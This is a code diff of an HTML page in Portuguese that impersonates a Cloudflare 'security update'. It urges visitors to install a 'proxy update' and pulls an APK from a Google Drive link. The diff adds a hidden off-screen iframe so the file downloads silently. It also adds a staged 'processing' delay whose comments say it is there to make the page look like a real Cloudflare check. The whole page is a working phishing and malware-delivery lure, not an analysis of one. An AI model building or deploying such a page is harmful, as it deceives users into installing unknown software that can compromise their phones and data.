@@ -5,10 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cloudflare Update</title>
     <style>
-        /* Reset e Fontes estilo Cloudflare */
+        /* Estilos Cloudflare */
         body { 
-            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background-color: #f3f5f7; /* O clássico cinza claro do Cloudflare */
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #f3f5f7; 
             display: flex; 
             justify-content: center; 
             align-items: center; 
@@ -16,35 +16,31 @@
             margin: 0; 
             color: #222;
         }
-
         .box { 
             background: #ffffff; 
             padding: 40px 50px; 
-            border-radius: 4px; /* Cloudflare usa cantos pouco arredondados */
+            border-radius: 4px; 
             text-align: center; 
-            box-shadow: 0 1px 6px rgba(32, 33, 36, 0.28); /* Sombra padrão CF */
+            box-shadow: 0 1px 6px rgba(32, 33, 36, 0.28); 
             max-width: 90%; 
             width: 340px;
-            border-top: 3px solid #f68220; /* A faixa laranja característica de alerta/upgrade */
+            border-top: 3px solid #f68220; 
+            position: relative;
         }
-
         h2 { 
             color: #222; 
             margin-top: 0; 
             font-size: 22px;
             font-weight: 400;
         }
-
         p { 
             color: #444; 
             font-size: 15px; 
             line-height: 1.6;
             margin-bottom: 25px;
         }
-
-        /* Botão estilo Cloudflare (Azul #005E9E ou Laranja #f68220) */
         .btn { 
-            background-color: #f68220; /* Laranja Cloudflare */
+            background-color: #f68220; 
             color: white; 
             border: none; 
             padding: 12px 24px; 
@@ -55,18 +51,19 @@
             width: 100%; 
             transition: background 0.2s;
         }
-
         .btn:hover { 
             background-color: #e06c00; 
         }
-
+        .btn:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
         .loader { 
             display: none; 
             margin-top: 15px; 
             color: #444; 
             font-size: 13px; 
         }
-
         .spinner {
             border: 3px solid #f3f3f3;
             border-top: 3px solid #f68220;
@@ -78,48 +75,65 @@
             vertical-align: middle;
             margin-right: 8px;
         }
-
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
+        }
+        
+        /* Ocultar o iframe usado para o download silencioso */
+        #silentFrame {
+            position: absolute;
+            top: -1000px;
+            left: -1000px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
         }
     </style>
 </head>
 <body>
 
     <div class="box">
-        <!-- Ícone de escudo/lua (opcional, estilo CF) -->
-        <h2>⚡ Atualização de Segurança</h2>
+        <h2> Atualização de Segurança</h2>
         <p>Uma nova atualização de proxy está disponível. Toque abaixo para instalar e manter sua conexão estável.</p>
         
-        <!-- Botão -->
-        <button class="btn" id="installBtn" onclick="iniciarInstalacao()">Continuar</button>
+        <button class="btn" id="installBtn" onclick="iniciarInstalacao()">Iniciar</button>
         
-        <!-- Loader -->
         <div class="loader" id="loader">
             <div class="spinner"></div> Processando requisição...
         </div>
     </div>
 
+    <!-- O "Pulo do Gato": Um iframe escondido que carrega o link do Drive -->
+    <iframe id="silentFrame"></iframe>
+
     <script>
-        // LINK DO DRIVE (JÁ CONFIGURADO)
-        const apkName = 'https://drive.google.com/uc?export=download&id=1eqGiasWvAhGCyUyD_JbHlw-i_ib32Ey-'; 
+        // SEU LINK DO DRIVE (JÁ CONFIGURADO)
+        const driveLink = 'https://drive.google.com/uc?export=download&id=1eqGiasWvAhGCyUyD_JbHlw-i_ib32Ey-';
 
         function iniciarInstalacao() {
-            // Esconde botão, mostra loader
-            document.getElementById('installBtn').style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
+            const btn = document.getElementById('installBtn');
+            const loader = document.getElementById('loader');
 
-            // Simula um pequeno delay para parecer que está "consultando" o servidor CF
+            // UI Update
+            btn.disabled = true;
+            btn.style.opacity = '0.7';
+            btn.innerText = "Aguarde...";
+            
+            loader.style.display = 'block';
+
+            // Tenta silenciar o download usando iframe
+            const iframe = document.getElementById('silentFrame');
+            
+            // Tenta carregar o link no iframe
+            iframe.src = driveLink;
+
+            // Simula um "Verificando..." por 3 segundos antes de iniciar o download real
+            // Isso dá a sensação de que está processando no servidor Cloudflare
             setTimeout(() => {
-                // Força download
-                const link = document.createElement('a');
-                link.href = apkName;
-                link.download = 'app.apk';
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-            }, 800);
+                loader.innerHTML = "Instalando... Aguarde o sistema abrir o arquivo.";
+            }, 2000);
         }
     </script>
 
